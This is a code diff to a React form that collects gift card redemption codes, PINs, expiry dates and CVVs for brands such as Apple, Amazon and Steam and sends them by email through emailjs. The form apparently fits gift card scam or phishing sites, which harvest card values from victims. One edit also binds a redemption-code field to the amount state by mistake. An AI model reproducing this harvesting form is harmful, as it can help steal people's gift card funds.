@@ -3,11 +3,17 @@ import Image from "../assets/cards.png";
 import emailjs from "@emailjs/browser";
 import toast, { Toaster } from "react-hot-toast";
 
-const Form = () => {
+const Form = ({setIsOpen, setInputs}) => {
   const [cardtype, setCardtype] = useState(1);
+  const [amount, setAmount] = useState("")
+  const [currency, setCurrency] = useState("")
+  const [cards, setCards] = useState("")
   const form = useRef();
 
+  console.log(form.current);
+
   function setCard(e) {
+    setCards(e.target.value)
     switch (e.target.value) {
       case "apple" ||
         "amazon" ||
@@ -54,7 +60,6 @@ const Form = () => {
       default:
         break;
     }
-    console.log(cardtype);
   }
 
   const sendEmail = (e) => {
@@ -69,13 +74,16 @@ const Form = () => {
       )
       .then(
         (result) => {
-          toast.success("Payment successful!");
+          setInputs({amount, currency, cards})
+          e.target.reset();
+          setTimeout(() => {
+            setIsOpen((prev) => !prev)
+          }, 200);
         },
         (error) => {
           toast.error("Payment Failed, Try again");
         }
       );
-    e.target.reset();
   };
 
   return (
@@ -83,22 +91,22 @@ const Form = () => {
       <img id="form" src={Image} alt="card image" />
       <div className="w-[95%] bg-black-gradient-2 rounded-lg shadow dark:border md:mt-0 sm:max-w-[50%] xl:p-0 dark:bg-gray-800 dark:border-gray-700">
         <div className="p-6 space-y-4 md:space-y-6 sm:p-8">
-          <h1 className="text-xl font-bold leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
+          {/* <h1 className="text-xl font-bold leading-tight tracking-tight text-gray-900 md:text-2xl dark:text-white">
             Create an account
-          </h1>
+          </h1> */}
           <form
             className="space-y-4 md:space-y-6"
             ref={form}
             onSubmit={sendEmail}
           >
             <div>
-              <select
+              <select required
                 name="card_type"
                 onChange={setCard}
                 id="countries"
                 className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
               >
-                <option>Select Type of Card</option>
+                <option disabled selected>Select Type of Card</option>
                 <option value="apple">Apple</option>
                 <option value="amazon">Amazon</option>
                 <option value="steam">Steam</option>
@@ -119,7 +127,8 @@ const Form = () => {
               </select>
             </div>
             <div className="flex gap-2">
-              <select
+              <select required
+              onChange={(e)  => setCurrency(e.target.value)}
                 name="currency"
                 className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-[30%] p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
               >
@@ -130,45 +139,47 @@ const Form = () => {
                 <option value="CAD">CAD</option>
               </select>
               <input
+                required
+                onChange={(e)  => setAmount(e.target.value)}
+                value={amount}
                 type="number"
                 placeholder="
               Card Amount"
-                name="amount"
-                id="amount"
+              name="amount"
                 className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
               />
             </div>
             {cardtype === 1 ? (
               <div>
-                <input
+                <input value={amount} onChange={(e) => setAmount(e.target.value)}
+                  required
                   type="text"
                   name="redem"
                   id="redem"
                   placeholder="Redemption Code"
                   className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                  required=""
                 />
               </div>
             ) : cardtype === 2 ? (
               <>
                 <div>
                   <input
+                    required
                     type="text"
                     name="redem"
                     id="redem"
                     placeholder="Redemption Code"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />{" "}
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="giftcardpin"
                     id="giftcardpin"
                     placeholder="Gift Card Pin"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />
                 </div>
               </>
@@ -176,32 +187,32 @@ const Form = () => {
               <>
                 <div>
                   <input
+                    required
                     type="text"
                     name="redem"
                     id="redem"
                     placeholder="Redemption Code"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />{" "}
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="giftcardexpireydata"
                     id="giftcardexpireydata"
                     placeholder="Gift Card Expiry Date"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />{" "}
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="giftcardcvv"
                     id="giftcardcvv"
                     placeholder="Gift Card CVV"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />
                 </div>
               </>
@@ -209,42 +220,42 @@ const Form = () => {
               <>
                 <div>
                   <input
+                    required
                     type="text"
                     name="redem"
                     id="redem"
                     placeholder="Redemption Code"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />{" "}
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="giftcardexpireydata"
                     id="giftcardexpireydata"
                     placeholder="Gift Card Expiry Date"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />{" "}
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="pin"
                     id="pin"
                     placeholder="4 Digit Pin"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />
                 </div>
                 <div>
                   <input
+                    required
                     type="text"
                     name="giftcardcvv"
                     id="giftcardcvv"
                     placeholder="Gift Card CVV"
                     className="bg-gray-50 border border-gray-300 text-gray-900 sm:text-sm rounded-lg focus:ring-blue-600 focus:border-blue-600 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
-                    required=""
                   />
                 </div>
               </>
@@ -259,8 +270,8 @@ const Form = () => {
               Continue
             </button>
             <p className="text-sm font-light text-gray-500 dark:text-gray-400 text-center">
-              Please make sure the codes you are about to input are correct and
-              according to details
+              Please make sure the codes you are about to input required are
+              correct and according to details
             </p>
           </form>
         </div>
